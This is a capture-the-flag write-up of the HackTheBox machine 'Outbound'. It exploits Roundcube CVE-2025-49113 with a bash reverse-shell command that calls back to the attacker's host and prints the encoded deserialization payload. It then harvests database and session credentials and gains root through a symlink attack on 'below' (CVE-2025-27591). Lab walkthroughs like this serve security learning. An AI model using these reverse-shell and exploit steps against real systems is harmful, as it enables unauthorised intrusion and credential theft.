# Outbound - Easy

Target IP: **10.129.232.158**

Credentials (Assumed Breach): ```tyler:LhKL1o9Nm3X2```

## User Flag

Initial scan: ```sudo nmap -sC -sV 10.129.232.158```

Output shows standard port 22 for ssh and port 80 running Nginx 1.24.0.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 redirects us to ```mail.outbound.htb```. Let's add it to our ```/etc/hosts``` file and navigate to it.

It shows us a login page, where we can use the given credentials to authenticate. This is running Roundcube Webmail, which we should take note of.

![1](Screenshots/O_1.jpg)

After logging in, we are greeted with this page. It seems like a standard mail application. It doesn't seem like there is any actual mail we can view.

![2](Screenshots/O_2.jpg)

Pressing on the "About" button on the bottom left corner, we learn about the version of Roundcube Webmail that is running. It is version 1.6.10.

![3](Screenshots/O_3.jpg)

Let's look for any publicly disclosed vulnerabilities. A search tells us that this version is vulnerable to CVE-2025-49113, a post-authentication RCE vulnerability.

Here is a [PoC](https://github.com/fearsoff-org/CVE-2025-49113). Let's try it.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-oampjurxap]─[~/CVE-2025-49113]
└──╼ [★]$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'

### Injecting payload...

### End payload: http://mail.outbound.htb//?_from=edit-%21%C8%22%C8%3B%C8i%C8%3A%C80%C8%3B%C8O%C8%3A%C81%C86%C8%3A%C8%22%C8C%C8r%C8y%C8p%C8t%C8_%C8G%C8P%C8G%C8_%C8E%C8n%C8g%C8i%C8n%C8e%C8%22%C8%3A%C81%C8%3A%C8%7B%C8S%C8%3A%C82%C86%C8%3A%C8%22%C8%5C%C80%C80%C8C%C8r%C8y%C8p%C8t%C8_%C8G%C8P%C8G%C8_%C8E%C8n%C8g%C8i%C8n%C8e%C8%5C%C80%C80%C8_%C8g%C8p%C8g%C8c%C8o%C8n%C8f%C8%22%C8%3B%C8S%C8%3A%C85%C89%C8%3A%C8%22%C8%2F%C8b%C8i%C8n%C8%2F%C8b%C8a%C8s%C8h%C8+%C8-%C8c%C8+%C8%27%C8b%C8a%C8s%C8h%C8+%C8-%C8i%C8+%C8%3E%C8%26%C8+%C8%2F%C8d%C8e%C8v%C8%2F%C8t%C8c%C8p%C8%2F%C81%C80%C8%5C%C82%C8e%C81%C80%C8%5C%C82%C8e%C81%C85%C8%5C%C82%C8e%C81%C89%C84%C8%2F%C84%C84%C84%C84%C8+%C80%C8%3E%C8%26%C81%C8%27%C8%3B%C8%23%C8%22%C8%3B%C8%7D%C8i%C8%3A%C80%C8%3B%C8b%C8%3A%C80%C8%3B%C8%7D%C8%22%C8%3B%C8%7D%C8%7D%C8&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...
```

We get a connection on our listener.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-oampjurxap]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.232.158 39404
bash: cannot set terminal process group (256): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ whoami
whoami
www-data
```

Looking at ```/etc/passwd```, we find out there are three users with a shell set.

```
www-data@mail:/var/www/html/roundcube/public_html$ cat /etc/passwd | grep sh
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```

Digging through the Roundcube config files, we find a set of MySQL credentials.

```
www-data@mail:/var/www/html/roundcube/public_html/roundcube/config$ cat config.inc.php | grep -i "pass"
<undcube/config$ cat config.inc.php | grep -i "pass"                
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';
// This key is used to encrypt the users imap password which is stored
```

Trying to authenticate to MySQL hangs.

```
www-data@mail:/var/www/html/roundcube/public_html$ mysql -u roundcube -p 
mysql -u roundcube -p
Enter password: RCDBPass2025
```

I looked elsewhere for a bit but returned to MySQL, because I thought this clearly was the intended path. I just had to upgrade my shell, and we can see the output on our shell after authentication.

```
www-data@mail:/var/www/html/roundcube/public_html$ mysql -u roundcube -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 254
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

The roundcube database clearly seems like what we are looking for.

```
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)
```

The user and session tables seem the most lucrative.

```
MariaDB [roundcube]> SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
```

In the users table, the preferences column seems to be storing password hashes?

```
MariaDB [roundcube]> SELECT * FROM users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2026-09-19 21:25:32 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"Z26VRKOztOjnib1H";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
```

Searching online tells us that this is a PHP serialized array that stores a key-value pair. Let's save the hashes for ```jacob``` and ```mel``` and try to crack them.

This doesn't work. Let's look elsewhere.

The sessions table stores information about establishes sessions, and we can see very recent entries, indicating that it has stored our sessions as ```tyler```. Here is one session that is very old, which leads me to think this could contain some valuable information about another valid user. The ```vars``` column seem to be base64 encoded.

We can take the string and base64 decode it. Let's see what we get.

It's another PHP serialized array. The output is very messy, but if we squint our eyes close enough, there seems to be a key-value pair containing the password for the ```jacob``` user.

```b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-oampjurxap]─[~]
└──╼ [★]$ cat session_vars 
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

However, trying to log in as with the string as the password doesn't work, which suggests that the string is encrypted in some way. Trying to crack it with hashcat fails, which leads me to extra enumeration.

Looking inside the ```bin``` directory, I spot script named ```decrypt.sh```. This might be what we are looking for.

Running the script along with our string, we do get an output.

```
nIk25Am/@mail:/var/www/html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgn
595mO8DmwGeD
```

However, this password also fails to log in through ssh. Maybe we log on the web application instead.

This does work.

![4](Screenshots/O_4.jpg)

A mail from Tyler seems to tell us the actual password to ssh in as ```jacob```.

This finally works, and we're in as ```jacob```.

```
jacob@outbound:~$ whoami
jacob
```

We can proceed to get the user flag from here.

## Root Flag

```sudo -l``` reveals a ```below``` binary we can run as ```root``` without a password.

```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

There didn't seem to be a direct command to query the version of the binary, but I found CVE-2025-27591, a privilege escalation vulnerability in versions below 0.9.0.

We do have full permissions over the ```/var/log/below``` directory, which is a prerequisite to exploitation. This leads me to believe that this is the intended pathway.

```
jacob@outbound:~$ ls -la /var/log | grep -i 'below'
drwxrwxrwx   3 root      root              4096 Jul 14  2025 below
```

I found a [PoC](https://github.com/incommatose/CVE-2025-27591-PoC) here, let's try it.

Since the ```/var/log/below``` directory and the error log file inside of it is world writable, we are able to create a symlink from that file to ```/etc/passwd``` and run ```sudo below record``` to write a malicious error message to the log, which in turn writes the contents into ```/etc/passwd```. In this case we write in an entry that adds a user with ```root``` level access without a password, then spawn a shell as the new user.

After we run the script, we get ```root```.

```
jacob@outbound:~$ ./poc.sh
evil@outbound:/home/jacob# id
uid=0(root) gid=0(root) groups=0(root)
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
